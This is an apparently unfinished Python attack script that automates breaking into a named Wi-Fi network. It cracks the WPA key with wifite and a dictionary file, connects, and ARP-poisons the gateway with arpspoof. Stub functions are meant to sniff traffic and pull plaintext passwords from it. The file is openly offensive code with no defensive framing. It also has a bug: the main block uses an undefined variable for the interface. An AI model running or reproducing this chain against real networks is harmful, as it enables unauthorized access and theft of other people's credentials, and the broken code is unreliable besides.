import os
import subprocess
import sys

INTERFACE_NAME = "wlan0"
WIFITE_PASSWORDS_FILE = "cracked.txt"
DICT_FILE = "dict.txt"

def setup():
    os.system("rm *.cap")
    os.system("rm {}".format(WIFITE_PASSWORDS_FILE))

def crackWPA(essid, dictFile):
    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
    with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
        for line in passwords.readlines():
            if '"key":' in line:
                print(line.split()[-1][1:-2])
                return line.split()[-1][1:-2]

def connectToNetwork(essid, password):
    subprocess.Popen(["iwconfig", INTERFACE_NAME, "essid", essid, "key", "s:{}".format(password)], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
    subprocess.Popen(["dhclient", INTERFACE_NAME], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()

def getGatewayIP():
    with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if line.split()[0] == "default":
                return line.split()[2]
        raise Exception("Gateway IP not found.")

def sniffTraffic():
    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
    pass

def parsePasswords():
    # Parse log file for plaintext passwords
    pass

def arpPoison(interface_name, host):
    arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return arpSpoofProc

if __name__ == "__main__":
    setup()
    essid = input("Enter the name of the network you'd like to attack:")
    password = crackWPA(essid, DICT_FILE)
    connectToNetwork(essid, password)
    gatewayIP = getGatewayIP()
    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
    sniffTraffic()
    parsePasswords()
    arpSpoofProc.terminate()